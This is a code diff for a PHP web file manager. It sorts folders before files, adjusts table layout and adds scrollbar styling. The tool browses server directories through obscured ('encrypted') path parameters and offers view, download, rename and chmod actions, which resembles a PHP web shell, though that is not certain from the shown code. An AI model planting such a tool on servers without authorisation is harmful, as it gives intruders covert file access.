@@ -113,45 +113,72 @@ function breadcrumbPath(string $path): string {
 }
 
 function fileManager(string $dir): void {
-    $files = array_diff(scandir($dir), ['.', '..']);
+    $allItems = array_diff(scandir($dir), ['.', '..']);
+    
+    // Separate folders and files, then sort them separately
+    $folders = [];
+    $files = [];
+    
+    foreach ($allItems as $item) {
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($fullPath)) {
+            $folders[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+    
+    // Sort each array alphabetically
+    sort($folders);
+    sort($files);
+    
+    // Combine with folders first, then files
+    $sortedItems = array_merge($folders, $files);
     
     echo '<div class="w-full overflow-x-auto">';
-    echo '<table class="w-full table-auto border-collapse">';
+    echo '<table class="w-full border-collapse table-fixed">';
     echo '<thead><tr class="bg-gray-200">';
-    echo '<th class="border px-4 py-2 text-left">Name</th>';
-    echo '<th class="border px-4 py-2 text-left">Size</th>';
-    echo '<th class="border px-4 py-2 text-left">Permissions</th>';
-    echo '<th class="border px-4 py-2 text-left">Last Modified</th>';
-    echo '<th class="border px-4 py-2 text-left">Actions</th>';
+    echo '<th class="border px-4 py-2 text-left w-1/3">Name</th>';
+    echo '<th class="border px-4 py-2 text-left w-1/12">Size</th>';
+    echo '<th class="border px-4 py-2 text-left w-1/6">Permissions</th>';
+    echo '<th class="border px-4 py-2 text-left w-1/6">Last Modified</th>';
+    echo '<th class="border px-4 py-2 text-left w-1/4">Actions</th>';
     echo '</tr></thead><tbody>';
     
     // Parent directory link
     echo '<tr class="hover:bg-gray-100">';
-    echo '<td class="border px-4 py-2"><a href="?cd=' . encryptPath(dirname($dir)) . '" class="text-blue-600 hover:underline">..</a></td>';
+    echo '<td class="border px-4 py-2">';
+    echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
+    echo '<a href="?cd=' . encryptPath(dirname($dir)) . '" class="text-blue-600 hover:underline block whitespace-nowrap">..</a>';
+    echo '</div>';
+    echo '</td>';
     echo '<td class="border px-4 py-2">-</td>';
     echo '<td class="border px-4 py-2">-</td>';
     echo '<td class="border px-4 py-2">-</td>';
     echo '<td class="border px-4 py-2">-</td>';
     echo '</tr>';
     
-    foreach ($files as $file) {
-        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
+    foreach ($sortedItems as $item) {
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
         $isDir = is_dir($fullPath);
         
         echo '<tr class="hover:bg-gray-100">';
         echo '<td class="border px-4 py-2">';
+        echo '<div class="overflow-x-auto w-full" style="max-height: 40px;">';
         
         if ($isDir) {
-            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($file) . '</a>';
+            echo '<a href="?cd=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline block whitespace-nowrap">' . htmlspecialchars($item) . '</a>';
         } else {
-            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline">' . htmlspecialchars($file) . '</a>';
+            echo '<a href="?action=view&file=' . encryptPath($fullPath) . '" class="text-blue-600 hover:underline block whitespace-nowrap">' . htmlspecialchars($item) . '</a>';
         }
         
+        echo '</div>';
         echo '</td>';
         echo '<td class="border px-4 py-2">' . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
         echo '<td class="border px-4 py-2">' . getPerms($fullPath) . '</td>';
         echo '<td class="border px-4 py-2">' . date("Y-m-d H:i:s", filemtime($fullPath)) . '</td>';
-        echo '<td class="border px-4 py-2 space-x-2">';
+        echo '<td class="border px-4 py-2">';
+        echo '<div class="flex flex-wrap gap-2">';
         
         if (!$isDir) {
             echo '<a href="?download=' . encryptPath($fullPath) . '" class="text-green-600 hover:underline">Download</a> ';
@@ -160,10 +187,28 @@ function fileManager(string $dir): void {
         
         echo '<a href="?action=rename&file=' . encryptPath($fullPath) . '" class="text-yellow-600 hover:underline">Rename</a> ';
         echo '<a href="?action=chmod&file=' . encryptPath($fullPath) . '" class="text-purple-600 hover:underline">Chmod</a>';
+        echo '</div>';
         echo '</td></tr>';
     }
     
     echo '</tbody></table></div>';
+    
+    // Add subtle custom CSS for scrollbars that only appear when needed
+    echo '<style>
+    .overflow-x-auto::-webkit-scrollbar {
+        height: 6px;
+    }
+    .overflow-x-auto::-webkit-scrollbar-track {
+        background: #f1f1f1;
+    }
+    .overflow-x-auto::-webkit-scrollbar-thumb {
+        background: #888;
+        border-radius: 3px;
+    }
+    .overflow-x-auto::-webkit-scrollbar-thumb:hover {
+        background: #555;
+    }
+    </style>';
 }
 
 function showAlert(string $message, string $type = 'success'): void {
